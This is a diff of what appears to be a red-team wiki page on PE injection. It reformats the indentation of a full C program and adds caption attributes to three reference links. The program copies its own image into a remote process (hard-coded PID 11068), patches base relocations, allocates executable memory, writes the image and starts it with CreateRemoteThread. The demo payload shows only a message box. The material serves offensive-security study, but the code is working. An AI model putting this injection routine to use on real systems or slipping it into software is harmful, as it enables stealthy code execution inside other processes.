@@ -65,65 +65,65 @@ Below shows how we've injected the PE into the notepad \(PID 11068\) and execute
 #include <Windows.h>
 
 typedef struct BASE_RELOCATION_ENTRY {
-	USHORT Offset : 12;
-	USHORT Type : 4;
+    USHORT Offset : 12;
+    USHORT Type : 4;
 } BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
 
 DWORD InjectionEntryPoint()
 {
-	CHAR moduleName[128] = "";
-	GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
-	MessageBoxA(NULL, moduleName, "Obligatory PE Injection", NULL);
-	return 0;
+    CHAR moduleName[128] = "";
+    GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
+    MessageBoxA(NULL, moduleName, "Obligatory PE Injection", NULL);
+    return 0;
 }
 
 int main()
 {
-	PVOID imageBase = GetModuleHandle(NULL);
-	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
-	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);
-	
-	PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
-	memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);
-	
-	HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, 11068);
-	PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    PVOID imageBase = GetModuleHandle(NULL);
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
+    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);
 
-	DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;
+    PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
+    memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);
 
-	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
-	DWORD relocationEntriesCount = 0;
-	PDWORD_PTR patchedAddress;
-	PBASE_RELOCATION_ENTRY relocationRVA = NULL;
-	
-	while (relocationTable->SizeOfBlock > 0)
-	{
-		relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
-		relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);
+    HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, 11068);
+    PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-		for (short i = 0; i < relocationEntriesCount; i++)
-		{
-			if (relocationRVA[i].Offset)
-			{
-				patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
-				*patchedAddress += deltaImageBase;
-			}
-		}
-		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
-	}
+    DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;
 
-	WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);
-	CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + deltaImageBase), NULL, 0, NULL);
+    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+    DWORD relocationEntriesCount = 0;
+    PDWORD_PTR patchedAddress;
+    PBASE_RELOCATION_ENTRY relocationRVA = NULL;
 
-	return 0;
+    while (relocationTable->SizeOfBlock > 0)
+    {
+        relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
+        relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);
+
+        for (short i = 0; i < relocationEntriesCount; i++)
+        {
+            if (relocationRVA[i].Offset)
+            {
+                patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
+                *patchedAddress += deltaImageBase;
+            }
+        }
+        relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
+    }
+
+    WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);
+    CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + deltaImageBase), NULL, 0, NULL);
+
+    return 0;
 }
 ```
 
 ## References
 
-{% embed url="https://www.andreafortuna.org/2018/09/24/some-thoughts-about-pe-injection/" %}
+{% embed url="https://www.andreafortuna.org/2018/09/24/some-thoughts-about-pe-injection/" caption="" %}
 
-{% embed url="https://blog.sevagas.com/PE-injection-explained" %}
+{% embed url="https://blog.sevagas.com/PE-injection-explained" caption="" %}
 
-{% embed url="https://www.malwaretech.com/2013/11/portable-executable-injection-for.html" %}
+{% embed url="https://www.malwaretech.com/2013/11/portable-executable-injection-for.html" caption="" %}
 
